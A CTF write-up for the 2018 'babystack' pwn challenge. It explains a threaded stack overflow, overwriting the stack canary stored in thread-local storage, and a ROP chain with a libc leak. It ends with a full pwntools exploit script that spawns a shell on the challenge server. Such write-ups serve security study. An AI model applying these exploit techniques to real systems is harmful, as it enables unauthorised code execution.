---
title:  Star Ctf 2018 Babystack
updated: 2018-05-01 16:10:33
tags: pwn
---



- [babystack](#orgdffcbc7)



<a id="orgdffcbc7"></a>

# babystack

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

The challenge creates a thread and calls a function start<sub>routine</sub>

```c
void *__fastcall start_routine(void *a1)
{
  void *result; // rax@2
  __int64 v2; // rcx@4
  unsigned __int64 v3; // [sp+8h] [bp-1018h]@1
  char s; // [sp+10h] [bp-1010h]@1
  __int64 v5; // [sp+1018h] [bp-8h]@1

  v5 = *MK_FP(__FS__, 40LL);
  memset(&s, 0, 0x1000uLL);
  puts("Welcome to babystack 2018!");
  puts("How many bytes do you want to send?");
  v3 = get_int();
  if ( v3 <= 0x10000 )
  {
    get_inp(0, &s, v3);
    puts("It's time to say goodbye.");
    result = 0LL;
  }
  else
  {
    puts("You are greedy!");
    result = 0LL;
  }
  v2 = *MK_FP(__FS__, 40LL) ^ v5;
  return result;
}
```

Well there is a huge overflow in the stack . During the ctf giving a very large input makes the program segfault inside the get<sub>inp</sub> function which dereference a location on the stack and it points to the errno variable but our overflow overwrite this pointer and causes trouble , I just found the offset and gave it a pointer to BS's which will be allways null , thus the read will terminate without any error . Next is to bypass the canary

As the function is called on a different thread , the thread will have a new stack and the canary is placed on the thread local storage structure. and this structure will be on top of the stack which gives us a opportunity to overflow in this case .

```c
  typedef struct
  {
    void *tcb;        /* Pointer to the TCB.  Not necessarily the
                 thread descriptor used by libpthread.  */
    dtv_t *dtv;
    void *self;       /* Pointer to the thread descriptor.  */
    int multiple_threads;
    int gscope_flag;
    uintptr_t sysinfo;
    uintptr_t stack_guard;
    uintptr_t pointer_guard;
    ...
  } tcbhead_t;
```

the fs segment register will always point to this . As it turns out i could not view the address which fs points with gdb , the `arch_prctl` syscall is responsible of setting address to these registers , by viewing the the argument of this syscall we can find the address of this structure .

    pwndbg> catch syscall 158
    Catchpoint 1 (syscall 'arch_prctl' [158])

this will stop the execution after the syscall has called

```nasm
pwndbg> reg
*RAX  0xffffffffffffffda
*RBX  0x1
*RCX  0x7ffff7dd9bb8 (init_tls+280) ◂— test   eax, eax
*RDX  0x7ffff7fc5010 ◂— 0x0
*RDI  0x1002
*RSI  0x7ffff7fc4700 ◂— 0x7ffff7fc4700
*R8   0xffffffffffffffff
 R9   0x0
*R10  0x22
*R11  0x206
*R12  0x22c3d0dcdbfa
*R13  0x10
 R14  0x0
*R15  0x7ffff7ffe170 ◂— 0x0
*RBP  0x7fffffffdbd0 —▸ 0x400040 ◂— 0x500000006
*RSP  0x7fffffffd9c0 ◂— 0x0
*RIP  0x7ffff7dd9bb8 (init_tls+280) ◂— test   eax, eax
pwndbg> x/10gx 0x7ffff7fc4700
0x7ffff7fc4700: 0x00007ffff7fc4700      0x00007ffff7fc5010
0x7ffff7fc4710: 0x00007ffff7fc4700      0x0000000000000000
0x7ffff7fc4720: 0x0000000000000000      0x0000000000000000
0x7ffff7fc4730: 0x0000000000000000      0x0000000000000000
0x7ffff7fc4740: 0x0000000000000000      0x0000000000000000
```

this is the address of the tls . the values are not populated yet .

```nasm
0x004009f2      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; '(' ; 40
0x004009fb      488945f8       mov qword [rbp - 8], rax
```

this is the code which copy the canary to the stack , so fs + 0x28 gives us the canary .

```nasm
pwndbg> x/4gx 0x7ffff7fc4700 + 0x28
0x7ffff7fc4728: 0x4339f83af5815e00      0xe535fd48502579dc
0x7ffff7fc4738: 0x0000000000000000      0x0000000000000000
```

now we can calculate the offset of the canary from the read buffer and overwrite it with a known values , then we can use the usual ROP techniques to get the shell .

```python

import hashlib,string

def p64(hex):
    from struct import pack
    return pack('<' + 'Q' * len(hex), *hex)
context.arch = 'amd64'
context.bits = 64
if True:
    context.log_level = "debug"
    io = remote ("47.91.226.78", 10005)
else:
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    env = { 'LD_PRELOAD' : './libc.so.6-56d992a0342a67a887b8dcaae381d2cc51205253'}
    io = process('bs',env=env )
    # gdb.attach(io,'''
    # b * 0x0400A1A
    # b * 0x00400A9C
    # ''')

def send(size,inp):
        io.recvuntil("How many bytes do you want to send?\n")
        io.sendline(str(size))
        io.send(str(inp))
def calc():
    leak=io.recvuntil('\n').strip()
    print leak
    l=leak.split(" == ")
    l[0]=(l[0][12:]).replace(')','')
    print l
    s=0
    for i in string.printable:
        for j in string.printable:
            for k in string.printable:
                for m in string.printable:
                    if hashlib.sha256(i+j+k+m+l[0]).hexdigest() == l[1]:
                        print i+j+k+m
                        io.sendlineafter("Give me xxxx:",i+j+k+m)
                        return
                    s=s+1
                    if s%10000==0:
                        print s

# send(0x10000,p64([0x602f00]) * ( 0x10000 / 8 ))
# 0x00400c03: pop rdi; ret;
# 0x00400c01: pop rsi; pop r15; ret;

calc()

payload = "A" * 0x1008 + "\x00" * 0x8
payload += p64([0x602d00,
                0x00400c03,
                0x601fb0,
                0x004007C0,
                0x00400c03,
                0x0,
                0x00400c01,
                0x602d00,
                0x0,
                0x004007E0,
                0x00400b90,
])
                
payload = payload.ljust( 6080 , "\x00" ) + p64([0x602f00])
payload = payload.ljust(0x1800,"\x00")
send(len(payload) , payload)


io.recvline()
libc_leak = u64(io.recvline()[:-1].ljust(0x8,"\x00"))
libc = libc_leak - 0x0006f690
magic = libc + 0xf1147

log.info("Libc Leak : " + hex(libc))


payload = p64([0x602d00,
               magic
])
               
io.sendline(payload)

io.interactive()
```

